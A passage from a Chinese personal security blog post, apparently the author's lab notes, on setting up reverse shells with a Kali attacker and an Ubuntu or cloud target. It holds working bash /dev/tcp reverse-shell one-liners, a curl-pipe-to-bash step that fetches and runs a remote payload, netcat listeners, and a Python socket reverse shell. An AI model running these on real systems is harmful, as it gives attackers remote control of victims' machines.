+<p>kali&#x505A;&#x653B;&#x51FB;&#x673A;</p>
+<ol>
+<li>&#x5728;web&#x76EE;&#x5F55;&#x521B;&#x5EFA;index&#x6587;&#x4EF6;&#xFF08;index.php or  index.html&#xFF09;,&#x5185;&#x5BB9;&#x4E3A;&#xFF1A;</li>
+</ol>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.111.130/2333 0&gt;&amp;1</span><br></pre></td></tr></table></div></figure>
+
+<ol start="2">
+<li>&#x5F00;&#x542F;&#x7AEF;&#x53E3;&#x76D1;&#x542C;</li>
+</ol>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netcat -lvvp 2333</span><br></pre></td></tr></table></div></figure>
+
+
+
+<p>Ubuntu&#x505A;&#x4E3A;&#x76EE;&#x6807;&#x673A;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.111.130|bash</span><br></pre></td></tr></table></div></figure>
+
+<hr>
+<blockquote>
+<p>linux &#x4E0B;&#x67E5;&#x770B;&#x516C;&#x7F51;ip</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl ifconfig.me</span><br><span class="line"></span><br><span class="line">curl cip.cc</span><br></pre></td></tr></table></div></figure>
+</blockquote>
+<blockquote>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41962612/article/details/122894614">Vim&#x7684;&#x57FA;&#x672C;&#x64CD;&#x4F5C;_TypicalSpider&#x7684;&#x535A;&#x5BA2;-CSDN&#x535A;&#x5BA2;_vim &#x4E0A;&#x4E0B;&#x5DE6;&#x53F3;&#x79FB;&#x52A8;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>&#x590D;&#x4E60;&#x4E00;&#x4E0B;vim&#x7136;&#x540E;&#x518D;&#x5728;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x5B89;&#x88C5;netcat&#xFF0C;&#x4F7F;&#x7528;netcat&#x5C31;&#x53EF;&#x4EE5;</p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2045394">linux centos7&#x5B89;&#x88C5;netcat - &#x817E;&#x8BAF;&#x4E91;&#x5F00;&#x53D1;&#x8005;&#x793E;&#x533A;-&#x817E;&#x8BAF;&#x4E91; (tencent.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</blockquote>
+<hr>
+<p>&#x5728;&#x4F7F;&#x7528;curl&#x914D;&#x5408;bash&#x4E4B;&#x524D;&#xFF0C;&#x5148;&#x4F7F;&#x7528;nc&#x7B49;&#x524D;&#x9762;&#x7684;&#x65B9;&#x5F0F;&#x770B;&#x770B;&#x80FD;&#x4E0D;&#x80FD;&#x53CD;&#x5F39;</p>
+<p>&#x7136;&#x540E;&#x9047;&#x5230;&#x4E86;&#x95EE;&#x9898;</p>
+<blockquote>
+<p>zsh: no such file or directory: /dev/tcp/1.117.75.165/1025</p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43199509/article/details/120028288">&#x53CD;&#x5F39;shell&#x5931;&#x8D25; &#x539F;&#x6765;&#x662F;&#x8FD9;&#x4E2A;&#x539F;&#x56E0;_&#x68A6;&#x60F3;&#x95F9;&#x949F;&#x7684;&#x535A;&#x5BA2;-CSDN&#x535A;&#x5BA2;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>&#x89E3;&#x51B3;&#x65B9;&#x5F0F;&#x5982;&#x4E0A;&#xFF08;&#x4F3C;&#x4E4E;&#x662F;&#x67D0;&#x4E2A;&#x914D;&#x7F6E;&#x6CA1;&#x6709;&#x5F00;&#xFF0C;&#x5BFC;&#x81F4;&#x4E0D;&#x80FD;&#x4F7F;&#x7528;&#x91CD;&#x5B9A;&#x5411;&#xFF09;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp;&gt; /dev/null</span><br><span class="line">apt-get -y install gcc make &amp;&gt; /dev/null</span><br><span class="line">./configure --enable-net-redirections</span><br></pre></td></tr></table></div></figure>
+
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://evilpan.com/2021/04/25/reverse-shell/">Reverse Shell &#x6742;&#x8C08; - evilpan</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>  </p>
+<p>&#x6700;&#x540E;&#x4E00;&#x53E5;&#x663E;&#x793A;&#x6CA1;&#x6709;./configure&#xFF0C;&#x8FD9;&#x600E;&#x4E48;&#x529E;</p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_25359841/article/details/123235421">Centos7 &#x5B89;&#x88C5;&#x7F16;&#x8BD1;&#x6269;&#x5C55;&#x4E2D; ./configure: No such file or directory_</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>&#x6CA1;&#x6709;&#x89E3;&#x51B3;&#x3002;&#x3002;&#x3002;&#x8FD8;&#x662F;&#x5361;&#x5728;&#x6CA1;&#x6709;/dev/tcp&#x8FD9;&#x4E2A;&#x5730;&#x65B9;</p>
+</blockquote>
+<p>&#x8F6C;&#x53BB;Ubuntu&#x5F53;&#x76EE;&#x6807;&#x673A;</p>
+<p>&#x4F7F;&#x7528; bash -i &#x6CA1;&#x6709;&#x53CD;&#x5E94;&#xFF0C;&#x60F3;&#x8981;&#x67E5;&#x770B;&#x5F53;&#x524D;&#x7684;&#x5F00;&#x653E;&#x7AEF;&#x53E3;</p>
+<blockquote>
+<p>Linux &#x67E5;&#x770B;&#x5F00;&#x653E;&#x7684;&#x7AEF;</p>
+<p>&#x4F7F;&#x7528;lsof &#x547D;&#x4EE4;&#xFF1A;listen of files</p>
+<p>&#x67E5;&#x770B;&#x67D0;&#x4E00;&#x4E2A;&#x7AEF;&#x53E3;&#x662F;&#x5426;&#x5F00;&#x653E;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i:1025</span><br></pre></td></tr></table></div></figure>
+
+<p>&#x540E;&#x6765;&#x91CD;&#x65B0;&#x8FDE;&#x63A5;&#x53EF;&#x4EE5;&#x548C;&#x670D;&#x52A1;&#x5668;&#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;&#x4E86;&#xFF0C;&#x5947;&#x602A;</p>
+</blockquote>
+<blockquote>
+<p>&#x6211;&#x4EEC;&#x77E5;&#x9053; -c &#x7684;&#x610F;&#x601D;&#x662F; command&#xFF0C;&#x6240;&#x4EE5; bash -c &#x540E;&#x9762;&#x5E94;&#x8BE5;&#x8DDF;&#x4E00;&#x4E2A; command&#x3002;</p>
+<p>&#x636E;&#x8BF4;&#x6539;&#x6210;&#x4E86;&#x4E0B;&#x9762;&#x90A3;&#x4E2A;kali&#x5C31;&#x53EF;&#x4EE5;&#x8FDE;&#x63A5;&#x4E86;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/1.117.75.165/9999 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></div></figure>
+
+<p>&#x53EF;&#x4EE5;&#x4E86;&#xFF0C;&#x4F7F;&#x7528;bash -c&#x5C31;&#x53EF;&#x4EE5;&#x8FDE;&#x63A5;kali&#x4E86;</p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://stackoverflow.com/questions/36022331/bash-i-dev-tcp-127-0-0-1-1234-01">https://stackoverflow.com/questions/36022331/bash-i-dev-tcp-127-0-0-1-1234-01</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> &#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#x7ED9;&#x4E86;&#x4E00;&#x4E9B;&#x89E3;&#x51B3;&#x529E;&#x6CD5;</p>
+<p>&#x76EE;&#x524D;&#x53EF;&#x80FD;&#x7684;&#x539F;&#x56E0;&#x5C31;&#x662F;&#x91CD;&#x5B9A;&#x5411;&#x7684;&#x95EE;&#x9898;&#xFF08;redirection&#xFF09;</p>
+</blockquote>
+<p>&#x63A5;&#x4E0B;&#x6765;&#x7684;&#x95EE;&#x9898;&#x5C31;&#x662F;&#xFF0C;&#x5982;&#x679C;&#x4F7F;&#x7528;kali&#x5F53;&#x505A;&#x653B;&#x51FB;&#x673A;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x5F53;&#x505A;&#x76EE;&#x6807;&#x673A;&#xFF0C;&#x4E5F;&#x8BB8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4E0B;&#x9762;&#x8FD9;&#x4E2A;&#x6587;&#x7AE0;&#x5C1D;&#x8BD5;&#x4E00;&#x4E0B;</p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/106307545">&#x5982;&#x4F55;&#x7528;&#x5185;&#x7F51;&#x865A;&#x62DF;&#x673A;kali&#x5B9E;&#x73B0;&#x53CD;&#x5F39;shell__kali&#x53CD;&#x5F39;shell</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<blockquote>
+<p>&#x539F;&#x7406;&#xFF1A;&#x4F3C;&#x4E4E;&#x662F;&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#xFF0C;&#x5C06;&#x672C;&#x673A;&#x7684;&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x5230;kali&#xFF1F;</p>
+</blockquote>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x672C;&#x673A;ip&#xFF1A;&#xFF08;&#x7528;ipconfig&#x6765;&#x67E5;&#x770B;&#xFF09;10.130.241.145</span><br></pre></td></tr></table></div></figure>
+
+<p>&#x554A;&#x8FD9;&#xFF0C;&#x53EF;&#x4EE5;&#x8BF4;&#x662F;&#x82E6;&#x607C;&#x4E86;&#x4E24;&#x4E2A;&#x5C0F;&#x65F6;&#x7684;&#x95EE;&#x9898;&#x89E3;&#x51B3;&#x4E86;</p>
+<hr>
+<p>&#x5173;&#x4E8E;curl&#x914D;&#x5408;bash&#x53CD;&#x5F39;shell&#x3002;</p>
+<ul>
+<li>web&#x6587;&#x4EF6;&#x76EE;&#x5F55;&#xFF0C;&#x7C97;&#x6D45;&#x7684;&#x7406;&#x89E3;&#x662F;&#x5DF2;&#x7ECF;&#x5C06;rarara.cn&#x8FD9;&#x4E2A;&#x7F51;&#x7AD9;&#x4E00;&#x4E00;&#x5BF9;&#x5E94;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x8BBF;&#x95EE;IP&#x5730;&#x5740;&#x5C31;&#x662F;&#x8BBF;&#x95EE;rarara.cn</li>
+<li>&#x53C8;&#x56E0;&#x4E3A;&#x8FD9;&#x4E2A;&#x7F51;&#x7AD9;&#x662F;&#x653E;&#x5728;**/www/wwwroot/**&#x8FD9;&#x4E2A;&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#xFF0C;&#x5982;&#x679C;&#x60F3;&#x8981;&#x4F7F;&#x7528;rarara.cn/shell.php;&#x5C31;&#x9700;&#x8981;&#x5C06;shell.php&#x653E;&#x5728;/www/wwwroot/&#x8FD9;&#x4E2A;&#x76EE;&#x5F55;&#x4E0B;</li>
+<li>&#x7531;&#x4E8E;curl&#x7684;&#x547D;&#x4EE4;&#x662F;</li>
+</ul>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 1.117.75.165/shell.php|bash</span><br></pre></td></tr></table></div></figure>
+
+<p>|&#x7684;&#x4F5C;&#x7528;&#x662F;&#x5C06;&#x524D;&#x4E00;&#x4E2A;&#x8F93;&#x51FA;&#x4F5C;&#x4E3A;&#x8F93;&#x5165;&#x8F93;&#x5230;&#x540E;&#x4E00;&#x4E2A;</p>
+<p>&#x6240;&#x4EE5;&#x53EA;&#x5728;shell.php&#x8FD9;&#x4E2A;&#x7A7A;&#x767D;&#x6587;&#x6863;&#x91CC;&#x9762;&#x5199;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;bash -i /dev/tcp/rarara.cn/9999 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></div></figure>
+
+<ul>
+<li><font color="red">&#x6CE8;&#x610F;&#xFF1A;2333&#x7AEF;&#x53E3;&#x4F3C;&#x4E4E;&#x662F;&#x5176;&#x4ED6;&#x4EC0;&#x4E48;&#x670D;&#x52A1;&#x7684;&#x7AEF;&#x53E3;&#xFF0C;&#x53EF;&#x80FD;&#x6709;&#x5360;&#x7528;&#xFF0C;&#x5C31;&#x4F1A;&#x51FA;&#x73B0;&#x65E0;&#x6CD5;&#x8FDE;&#x63A5;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x6240;&#x4EE5;&#x9009;&#x62E9;9999&#x7AEF;&#x53E3;&#x4F5C;&#x4E3A;&#x4EA4;&#x4E92;&#x7684;&#x7AEF;&#x53E3;</font></li>
+</ul>
+<hr>
+<p>&#x4F3C;&#x4E4E;&#x662F;&#x865A;&#x62DF;&#x673A;kali&#x7684;ip&#xFF1A;27.17.220.135:13046</p>
+<p>&#x600E;&#x4E48;&#x548C;&#x672C;&#x673A;&#x4E0D;&#x4E00;&#x6837;&#x554A;&#x8FD9;</p>
+<p>&#x3002;&#x3002;&#x4E0D;&#x61C2;</p>
+<hr>
+<p>&#x6709;&#x4E2A;&#x597D;&#x6587;&#x7AE0;&#xFF0C;&#x662F;&#x4E2A;&#x6587;&#x5E93;&#x5408;&#x96C6;</p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1944153">&#x5E72;&#x8D27; | &#x5B66;&#x4E60;&#x7F51;&#x7EDC;&#x5B89;&#x5168;&#xFF0C;&#x63A8;&#x8350;6&#x4E2A;&#x6211;&#x5E38;&#x7528;&#x7684;&#x5B89;&#x5168;&#x77E5;&#x8BC6;&#x5728;&#x7EBF;&#x624B;&#x518C; - &#x817E;&#x8BAF;&#x4E91;&#x5F00;&#x53D1;&#x8005;&#x793E;&#x533A;-&#x817E;&#x8BAF;&#x4E91; (tencent.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/index.html">Web&#x5B89;&#x5168;&#x5B66;&#x4E60;&#x7B14;&#x8BB0; &#x2014; Web&#x5B89;&#x5168;&#x5B66;&#x4E60;&#x7B14;&#x8BB0; 1.0 &#x6587;&#x6863; (websec.readthedocs.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://gh0st.cn/Binary-Learning/%E5%88%9D%E7%BA%A7%E7%AF%87.html">&#x521D;&#x7EA7;&#x7BC7; - &#x6EF4;&#x6C34;&#x9006;&#x5411;&#x8BFE;&#x7A0B;&#x7B14;&#x8BB0; (gh0st.cn)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h4 id="python&#x811A;&#x672C;&#x53CD;&#x5F39;shell">
+          <a href="#python&#x811A;&#x672C;&#x53CD;&#x5F39;shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#python&#x811A;&#x672C;&#x53CD;&#x5F39;shell" class="headerlink" title="python&#x811A;&#x672C;&#x53CD;&#x5F39;shell"></a>python&#x811A;&#x672C;&#x53CD;&#x5F39;shell</h4>
+      <p>&#x653B;&#x51FB;&#x673A;&#xFF1A;(&#x76D1;&#x542C;&#x7AEF;&#x53E3;&#x5373;&#x53EF;)</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netcat -lvvp 2333</span><br></pre></td></tr></table></div></figure>
+
+
+
+<p>&#x76EE;&#x6807;&#x673A;&#xFF1A;</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python -c </span><br><span class="line"><span class="string">&apos;import socket,subprocess,os;</span></span><br><span class="line"><span class="string">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span></span><br><span class="line"><span class="string">s.connect((&quot;&#x653B;&#x51FB;&#x673A;&#x516C;&#x7F51;ip&quot;,9999));</span></span><br><span class="line"><span class="string">os.dup2(s.fileno(),0);</span></span><br><span class="line"><span class="string">os.dup2(s.fileno(),1); </span></span><br><span class="line"><span class="string">os.dup2(s.fileno(),2);</span></span><br><span class="line"><span class="string">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span></span><br></pre></td></tr></table></div></figure>
+
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://example.com">Kirsten Carton</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://example.com/2022/10/03/%E5%8F%8D%E5%BC%B9shell/">http://example.com/2022/10/03/%E5%8F%8D%E5%BC%B9shell/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/web/">web</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/linux/">linux</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/shell/">shell</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/10/15/ssti-ssti/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">ssti-ssti</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2022/10/01/buu/"><span class="paginator-prev__text">buu</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.</span> <span class="toc-text">
+          正向连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.</span> <span class="toc-text">
+          反向连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nc%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4"><span class="toc-number">3.</span> <span class="toc-text">
+          nc常用指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%90%91shell"><span class="toc-number">4.</span> <span class="toc-text">
+          正向shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%90%91shell"><span class="toc-number">5.</span> <span class="toc-text">
+          反向shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8nc"><span class="toc-number">5.1.</span> <span class="toc-text">
+          使用nc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8bash"><span class="toc-number">5.2.</span> <span class="toc-text">
+          使用bash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Curl%E9%85%8D%E5%90%88Bash%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">5.3.</span> <span class="toc-text">
+          Curl配合Bash反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#python%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">5.4.</span> <span class="toc-text">
+          python脚本反弹shell</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="images/imageone/avator one.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">May you be faithful to yourself,live seriously and freely.</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/KirstenCarton" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://plus.google.com/" target="_blank" rel="noopener" data-popover="Google" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-google"></i></span></a><a class="sidebar-ov-social-item" href="https://twitter.com/" target="_blank" rel="noopener" data-popover="Twitter" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-twitter"></i></span></a><a class="sidebar-ov-social-item" href="https://youtube.com/" target="_blank" rel="noopener" data-popover="Youtube" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-youtube"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">36</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">3</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">37</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Kirsten Carton</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v6.0.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
